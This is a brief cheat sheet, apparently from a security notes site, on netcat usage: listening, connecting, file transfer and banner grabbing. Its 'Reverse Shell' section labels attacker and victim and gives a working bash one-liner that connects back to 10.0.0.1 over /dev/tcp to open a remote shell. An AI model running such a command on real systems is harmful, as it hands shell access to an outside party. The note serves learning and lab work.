---
title: "Netcat - Basics"
description: "The Swiss Army knife of networking — listen, connect, transfer."
category: "Network"
tags: ["netcat", "network", "reverse-shell"]
publishDate: 2026-04-24
---

Netcat (`nc`) opens raw TCP/UDP connections. Pairs well with [Nmap](/notes/nmap-basics) for recon.

## Listen & Connect

```bash
# Listen on port 4444
nc -lvnp 4444

# Connect to host
nc 192.168.1.1 4444
```

## File Transfer

```bash
# Receiver
nc -lvnp 4444 > file.txt

# Sender
nc 192.168.1.1 4444 < file.txt
```

## Reverse Shell

```bash
# Attacker — listen
nc -lvnp 4444

# Victim — connect back
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

## Banner Grabbing

```bash
nc -nv 192.168.1.1 80
HEAD / HTTP/1.0
```
